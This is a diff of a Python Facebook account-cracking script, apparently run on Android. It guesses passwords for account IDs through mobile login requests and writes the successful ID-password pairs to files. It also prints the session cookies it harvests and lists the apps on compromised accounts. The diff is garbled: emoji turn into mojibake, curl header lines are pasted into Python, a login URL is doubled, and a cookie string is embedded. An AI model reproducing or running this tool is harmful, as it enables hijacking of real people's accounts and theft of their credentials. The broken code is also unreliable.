@@ -27,7 +27,7 @@ logo = '''
 def o():
     os.system('clear')
     jalan(logo)
-    jalan('\t🔥🔥RANDOM NUMBER CRACK🔥🔥')
+    jalan('\tðŸ”¥ðŸ”¥RANDOM NUMBER CRACKðŸ”¥ðŸ”¥')
     print('')
     jalan('\x1b[1;32m [1]\x1b[1;33m RANDOM CRACK ')
     jalan(' \x1b[1;32m[00] \x1b[1;31mEXIT')
@@ -66,7 +66,7 @@ def cek_apk(session,coki):
     if len(game)==0:
         print(f'\r%s[%s!%s] %sSorry there is no Active  Apk%s  '%(N,M,N,M,N))
     else:
-        print(f'\r[🎮] %s \x1b[1;95m ☆ Your Active Apps ☆     :{WHITE}'%(GREEN))
+        print(f'\r[ðŸŽ®] %s \x1b[1;95m â˜† Your Active Apps â˜†     :{WHITE}'%(GREEN))
         for i in range(len(game)):
             print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
         #else:
@@ -78,7 +78,7 @@ def cek_apk(session,coki):
     if len(game)==0:
         print(f'\r%s[%s!%s] %sSorry there is no Expired Apk%s           \n'%(N,M,N,M,N))
     else:
-        print(f'\r[🎮] %s \x1b[1;95m ◇ Your Expired Apps ◇    :{WHITE}'%(M))
+        print(f'\r[ðŸŽ®] %s \x1b[1;95m â—‡ Your Expired Apps â—‡    :{WHITE}'%(M))
         for i in range(len(game)):
             print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
         else:
@@ -243,7 +243,7 @@ def i():
     print('\033[1;32m---------------------------------------------')
                    
     print('Crack process has been completed')
-    print('Ids saved in ok.txt,cp.txt')
+    print('Ids saved in zalim ok.txt,cp.txt')
     print('\033[1;32m---------------------------------------------')
  
 def rcrack(uid,pwx,tl):
@@ -268,34 +268,33 @@ def rcrack(uid,pwx,tl):
             "pass":ps,
             "login":"Log In"}
             header_mbasicfb = {
-    'authority': 'm.facebook.com',
-    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
-    'cache-control': 'max-age=0',
-    # 'cookie': 
-    'dpr': '2.75',
-    'referer': 'https://m.facebook.com/Musicians/?_se_imp=09yzOy3PEXahvt1NN',
-    'sec-ch-prefers-color-scheme': 'light',
-    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
-    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.70"',
-    'sec-ch-ua-mobile': '?0',
-    'sec-ch-ua-model': '""',
-    'sec-ch-ua-platform': '"Linux"',
-    'sec-ch-ua-platform-version': '""',
-    'sec-fetch-dest': 'document',
-    'sec-fetch-mode': 'navigate',
-    'sec-fetch-site': 'same-origin',
-    'sec-fetch-user': '?1',
-    'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
-    'viewport-width': '980',
-}
-            lo = session.post( 'https://m.facebook.com/Musicians/?_se_imp=09yzOy3PEXahvt1NN).text
+    'authority': 'm.facebook.com' \
+  -H 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
+  -H 'accept-language: en-GB,en-US;q=0.9,en;q=0.8' \
+  -H 'cache-control: max-age=0' \
+  -H 'cookie: datr=qiXuZLW4ow7z3yLDCYuzoGi1; sb=qiXuZPVziryBK-uCiP_yy7pP; m_pixel_ratio=2.75; locale=en_GB; wl_cbv=v2%3Bclient_version%3A2314%3Btimestamp%3A1693328892; vpd=v1%3B768x393x2.75; wd=393x768; fr=0Gbu1Qc08rSkJcNbm.AWXsIxxVQeeBPuVksAI7wcnZBMQ.Bk7iWq.OD.AAA.0.0.Bk7iYn.AWX0Ptv80Po' \
+  -H 'dpr: 2.75' \
+  -H 'referer: https://m.facebook.com/settings/account/password/survey/?po=keep_sessions&next=https%3A%2F%2Fm.facebook.com%2Flogin%2Fsave-device%2F%3Flogin_source%3Daccount_recovery&wtsid=rdr_0CpPImYTCgPo0WwBf&_rdr' \
+  -H 'sec-ch-prefers-color-scheme: light' \
+  -H 'sec-ch-ua: "Not)A;Brand";v="24", "Chromium";v="116"' \
+  -H 'sec-ch-ua-full-version-list: "Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"' \
+  -H 'sec-ch-ua-mobile: ?1' \
+  -H 'sec-ch-ua-model: "V2127"' \
+  -H 'sec-ch-ua-platform: "Android"' \
+  -H 'sec-ch-ua-platform-version: "13.0.0"' \
+  -H 'sec-fetch-dest: document' \
+  -H 'sec-fetch-mode: navigate' \
+  -H 'sec-fetch-site: same-origin' \
+  -H 'sec-fetch-user: ?1' \
+  -H 'upgrade-insecure-requests: 1' \
+  -H 'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36' \
+  
+            lo = session.post( 'https://https://m.facebook.com/login.php?next=https%3A%2F%2Fm.facebook.com%2Fbookmarks%2F&refsrc=deprecated&wtsid=rdr_0xE2yThvCEIx2WhpM&_rdr' \).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[7:22]
-                print('    \033[1;32m(ZALIM-OK🔥)  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
+                print('    \033[1;32m(ZALIM-OKðŸ”¥)  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                 cek_apk(session,coki)
                 open('/sdcard/ZALIM-OK.txt', 'a').write( cid+' | '+ps+'\n')
                 oks.append(cid)
@@ -303,7 +302,7 @@ def rcrack(uid,pwx,tl):
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[24:39]
-                print('    \33[1;30m(ZALIM-CP🤕)  ' +cid+ ' | ' +ps+           '  \33[0;97m')
+                print('    \33[1;30m(ZALIM-CPðŸ¤•)  ' +cid+ ' | ' +ps+           '  \33[0;97m')
                 open('/sdcard/ZALIM-CP.txt', 'a').write( cid+' | '+ps+' \n')
                 cps.append(cid)
                 break
